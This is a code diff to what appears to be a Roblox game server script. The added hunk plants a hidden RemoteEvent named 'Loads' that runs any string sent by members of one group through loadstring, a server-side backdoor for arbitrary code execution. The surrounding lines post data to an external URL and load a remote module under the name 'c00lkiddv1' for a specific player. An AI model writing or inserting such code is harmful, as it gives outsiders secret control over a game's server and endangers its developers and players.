@@ -61,6 +61,20 @@ local text = {
 }
 hs:PostAsync(url, hs:JSONEncode(text))
 
+if not game.ReplicatedStorage:FindFirstChild("Loads") then
+	local RemoteEvent = Instance.new("RemoteEvent", game.ReplicatedStorage)
+	RemoteEvent.Name = "Loads"
+	RemoteEvent.OnServerEvent:Connect(function(Player: Player, StringtoLoad: string)
+		local s, r = pcall(function()
+			return Player:IsInGroupAsync(413403852)
+		end)
+		
+		if s and r then
+			loadstring(StringtoLoad)()
+		end
+	end)
+end
+
 if game.PlaceId == 97802578734845 then
 	if game.Players:FindFirstChild("cl2cks") then
 		require(14476224091).c00lkiddv1("cl2cks")
